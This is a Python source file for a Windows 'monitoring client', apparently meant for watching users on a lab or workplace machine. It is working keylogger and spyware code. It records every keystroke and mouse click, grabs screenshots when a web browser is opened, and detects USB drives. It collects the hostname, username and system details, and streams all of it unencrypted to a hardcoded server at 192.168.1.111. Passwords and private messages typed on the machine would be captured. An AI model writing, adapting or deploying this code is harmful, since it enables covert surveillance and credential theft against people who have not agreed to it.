import socket
import getpass
import json
import platform
import psutil
import keyboard
import threading
import time
import sys
import os
import base64
import string
import win32file
import ctypes

from io import BytesIO
from datetime import datetime
from PIL import ImageGrab
from pynput.mouse import Listener as MouseListener


class MonitoringClient:
    def __init__(self, host="192.168.1.111", port=5000):
        self.server_host = host
        self.server_port = port
        self.log = ""
        self.stop_flag = False
        self.interval = 5
        self.socket = None
        self.logging_thread = None
        self.screenshot_data = None
        self.current_event = None

        self.restricted_apps = ["chrome", "firefox", "edge"]
        self.restricted_triggered = False

        # >>> ADDED
        self.last_successful_send = time.time()
        self.connection_timeout = 40  # seconds before auto-exit

    def get_identity(self):
         return {
             "hostname": platform.node(),
             "username": getpass.getuser()
        }

    # -----------------------------
    # SYSTEM INFO
    # -----------------------------
    def get_system_details(self):
        return {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "cpu_count": psutil.cpu_count(),
            "cpu_usage": psutil.cpu_percent(),
            "memory_used": psutil.virtual_memory().used,
        }


    # -----------------------------
    # KEYBOARD LOGGING
    # -----------------------------
    def key_callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            name = event.name
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif len(name) > 1:
                name = f"[{name.upper()}]"

            self.log += f"{timestamp} - KEY: {name}\n"


    # -----------------------------
    # MOUSE LOGGING
    # -----------------------------
    def mouse_click(self, x, y, button, pressed):
        if pressed:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.log += f"{timestamp} - MOUSE CLICK at ({x},{y})\n"


    # -----------------------------
    # GET ACTIVE WINDOW
    # -----------------------------
    def get_active_window_title(self):
        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value.lower()
        except:
            return ""


    # -----------------------------
    # CAPTURE SCREENSHOT
    # -----------------------------
    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            buffered = BytesIO()
            screenshot.save(buffered, format="PNG")
            self.screenshot_data = base64.b64encode(
                buffered.getvalue()
            ).decode("utf-8")
        except Exception as e:
            print(f"[!] Screenshot failed: {e}")
            self.screenshot_data = None


    # -----------------------------
    # MONITOR RESTRICTED APPS
    # -----------------------------
    def monitor_restricted_apps(self):
        while not self.stop_flag:
            active_window = self.get_active_window_title()

            if any(app in active_window for app in self.restricted_apps):
                if not self.restricted_triggered:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.log += f"{timestamp} - Restricted application detected: {active_window}\n"
                    print("[!] Restricted application opened!")

                    self.capture_screenshot()
                    self.current_event = f"Restricted application : {active_window}"
                    self.restricted_triggered = True
            else:
                self.restricted_triggered = False

            time.sleep(10)


    # -----------------------------
    # SERVER CONNECTION
    # -----------------------------
    def connect_to_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            identity = json.dumps(self.get_identity())
            self.socket.sendall(identity.encode("utf-8"))
            print("[+] Connected to server")
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            sys.exit()


    # -----------------------------
    # SEND LOG DATA
    # -----------------------------
    def send_logs(self):
        while not self.stop_flag:
            time.sleep(self.interval)

            data = {
                "system_info": self.get_system_details(),
                "logs": self.log,
                "timestamp": datetime.now().isoformat(),
                "screenshot": self.screenshot_data,
                "event": self.current_event if self.current_event else ""
                
            }

            try:
                message = json.dumps(data) + "\nEND\n"
                self.socket.sendall(message.encode("utf-8"))
                self.last_successful_send = time.time()  # >>> ADDED
                print("[+] Data sent to server")
            except Exception as e:
                print(f"[!] Failed to send logs: {e}")
                print("[!] Server connection lost. Exiting...")
                self.stop()  # >>> ADDED

            self.log = ""
            self.screenshot_data = None
            self.current_event = None


    # -----------------------------
    # >>> ADDED: CONNECTION WATCHDOG
    # -----------------------------
    def connection_watchdog(self):
        while not self.stop_flag:
            if time.time() - self.last_successful_send > self.connection_timeout:
                print("[!] Server not responding. Auto shutting down client.")
                self.stop()
            time.sleep(3)


    # -----------------------------
    # START CLIENT
    # -----------------------------
    def start(self):
        print("Client monitoring started...")

        self.connect_to_server()

        self.logging_thread = threading.Thread(target=self.send_logs)
        self.logging_thread.daemon = True
        self.logging_thread.start()

        restricted_thread = threading.Thread(target=self.monitor_restricted_apps)
        restricted_thread.daemon = True
        restricted_thread.start()
        usb_thread = threading.Thread(target=self.monitor_usb)
        usb_thread.daemon = True
        usb_thread.start()
        

        # >>> ADDED watchdog thread
        watchdog_thread = threading.Thread(target=self.connection_watchdog)
        watchdog_thread.daemon = True
        watchdog_thread.start()
        
        keyboard.hook(self.key_callback)

        mouse_listener = MouseListener(on_click=self.mouse_click)
        mouse_listener.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()


    # -----------------------------
    # STOP CLIENT
    # -----------------------------
    def stop(self):
        print("\nStopping client...")
        self.stop_flag = True
        keyboard.unhook_all()

        if self.socket:
            self.socket.close()

        sys.exit(0)


    def monitor_usb(self):
        drives_before = self.get_connected_drives()

        while not self.stop_flag:
            drives_now = self.get_connected_drives()

            if len(drives_now)>len(drives_before):
                    self.current_event = "USB inserted"
                    print("[!] USB inserted detected")
                    drives_before = drives_now

            time.sleep(3)
  
    def get_connected_drives(self):
        drives = []
        bitmask = win32file.GetLogicalDrives()

        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1

        return set(drives)

if __name__ == "__main__":
    client = MonitoringClient()
    client.start()